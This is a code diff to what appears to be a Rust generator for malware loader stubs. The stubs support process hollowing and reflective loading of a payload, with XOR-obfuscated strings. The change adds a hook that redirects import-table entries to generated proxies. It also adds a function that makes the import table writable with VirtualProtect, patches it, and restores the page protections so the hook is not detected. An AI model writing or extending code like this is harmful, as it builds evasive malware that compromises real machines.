@@ -59,14 +59,17 @@ pub fn render_block(pipeline: &[RuntimeStep], strings: &StringsConfig) -> String
 /// cannot collide with the technique fragments injected into the same file,
 /// and re-exported so the fragments call `crate::resolve_imports`.
 const IMPORTS_BLOCK: &str = r##"mod imports {
-    use std::ffi::CStr;
+    use std::ffi::{c_void, CStr};
 
     use windows::core::PCSTR;
     use windows::Win32::Foundation::HMODULE;
     use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
+    use windows::Win32::System::Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE};
 
     /// `IMAGE_ORDINAL_FLAG64`: an import thunk with this bit set is by ordinal.
     const IMAGE_ORDINAL_FLAG64: u64 = 0x8000_0000_0000_0000;
+    /// Page size used when restoring the IAT page protections.
+    const PAGE_SIZE: usize = 0x1000;
 
     #[derive(Debug, thiserror::Error)]
     pub enum ImportError {
@@ -78,6 +81,8 @@ const IMPORTS_BLOCK: &str = r##"mod imports {
         LoadFailed { dll: String },
         #[error("could not resolve '{func}' from '{dll}'")]
         ResolveFailed { dll: String, func: String },
+        #[error("could not change the protection of the import table")]
+        ProtectFailed,
     }
 
     /// Resolves the payload's import table into `(IAT RVA, address)` pairs.
@@ -85,15 +90,19 @@ const IMPORTS_BLOCK: &str = r##"mod imports {
     /// `rva_to_offset` maps an image RVA to a byte offset inside `image`, which
     /// lets the same code walk a file-layout image (process hollowing) and an
     /// already-mapped image whose RVAs are their own offsets (reflective
-    /// loading). The caller writes each address into its IAT slot.
-    pub fn resolve_imports<F>(
+    /// loading). `policy` decides, per `(dll, function)`, whether the slot is
+    /// served by a generated proxy (`Some(address)`) or by the real resolution
+    /// (`None`). The caller writes each resulting value into its IAT slot.
+    pub fn resolve_imports<F, P>(
         image: &[u8],
         import_dir_rva: u32,
         import_dir_size: u32,
         rva_to_offset: F,
+        policy: P,
     ) -> Result<Vec<(u32, u64)>, ImportError>
     where
         F: Fn(u32) -> Option<usize>,
+        P: Fn(&str, &str) -> Option<u64>,
     {
         let mut resolved = Vec::new();
         if import_dir_rva == 0 || import_dir_size == 0 {
@@ -156,9 +165,11 @@ const IMPORTS_BLOCK: &str = r##"mod imports {
                     )
                 };
 
-                let address =
-                    address.ok_or_else(|| ImportError::ResolveFailed { dll: dll.clone(), func })?;
-                resolved.push((first_thunk + i * 8, address as u64));
+                let proxied = policy(&dll, &func);
+                let real = address
+                    .ok_or_else(|| ImportError::ResolveFailed { dll: dll.clone(), func })?;
+                let value = proxied.unwrap_or(real as u64);
+                resolved.push((first_thunk + i * 8, value));
                 i += 1;
             }
 
@@ -167,6 +178,71 @@ const IMPORTS_BLOCK: &str = r##"mod imports {
 
         crate::tech_dbg!("imports", "resolved {} import(s)", resolved.len());
         Ok(resolved)
+    }
+
+    /// Resolves the payload's imports and writes them into an already-mapped
+    /// image's IAT, serving catalogue hits from `policy`.
+    ///
+    /// The slot range is made writable first (the loader maps the IAT
+    /// read-only) and every touched page is restored to its original protection
+    /// afterwards, so the IAT does not stay writable (which is itself an
+    /// IAT-hook signal). The mapped image uses identity RVA→offset mapping.
+    pub fn patch_imports<P>(
+        image: &mut [u8],
+        import_dir_rva: u32,
+        import_dir_size: u32,
+        policy: P,
+    ) -> Result<usize, ImportError>
+    where
+        P: Fn(&str, &str) -> Option<u64>,
+    {
+        let imports = resolve_imports(
+            image,
+            import_dir_rva,
+            import_dir_size,
+            |rva| Some(rva as usize),
+            &policy,
+        )?;
+        if imports.is_empty() {
+            return Ok(0);
+        }
+
+        let base = image.as_ptr() as usize;
+        let mut lo = usize::MAX;
+        let mut hi = 0usize;
+        for (rva, _) in &imports {
+            let at = base + *rva as usize;
+            lo = lo.min(at);
+            hi = hi.max(at + 8);
+        }
+
+        // Record each page's original protection and make the range writable.
+        let mut pages: Vec<(usize, PAGE_PROTECTION_FLAGS)> = Vec::new();
+        let mut page = lo & !(PAGE_SIZE - 1);
+        while page < hi {
+            let mut old = PAGE_PROTECTION_FLAGS(0);
+            unsafe {
+                VirtualProtect(page as *const c_void, PAGE_SIZE, PAGE_READWRITE, &mut old)
+                    .map_err(|_| ImportError::ProtectFailed)?;
+            }
+            pages.push((page, old));
+            page += PAGE_SIZE;
+        }
+
+        let count = imports.len();
+        for (iat_rva, address) in imports {
+            let slot = (base + iat_rva as usize) as *mut u64;
+            unsafe { *slot = address };
+        }
+
+        // Restore the original protection, page by page.
+        for (page, old) in pages {
+            let mut tmp = PAGE_PROTECTION_FLAGS(0);
+            unsafe {
+                let _ = VirtualProtect(page as *const c_void, PAGE_SIZE, old, &mut tmp);
+            }
+        }
+        Ok(count)
     }
 
     /// Loads an imported DLL by name.
@@ -225,7 +301,7 @@ const IMPORTS_BLOCK: &str = r##"mod imports {
 }
 
 #[allow(unused_imports)]
-use imports::{resolve_imports, ImportError};
+use imports::{patch_imports, resolve_imports, ImportError};
 "##;
 
 #[cfg(test)]
@@ -266,7 +342,11 @@ mod tests {
     fn renders_the_resolver_and_reexports_it() {
         let block = render_block(&pipeline("technique: process_hollowing\n"), &xor_config());
         assert!(block.contains("pub fn resolve_imports"));
-        assert!(block.contains("use imports::{resolve_imports, ImportError};"));
+        assert!(block.contains("pub fn patch_imports"));
+        assert!(block.contains("use imports::{patch_imports, resolve_imports, ImportError};"));
+        // The IAT is made writable and its pages restored.
+        assert!(block.contains("VirtualProtect"));
+        assert!(block.contains("PAGE_READWRITE"));
         // No placeholder may survive into the generated stub.
         assert!(!block.contains('$'), "unsubstituted placeholder: {block}");
     }
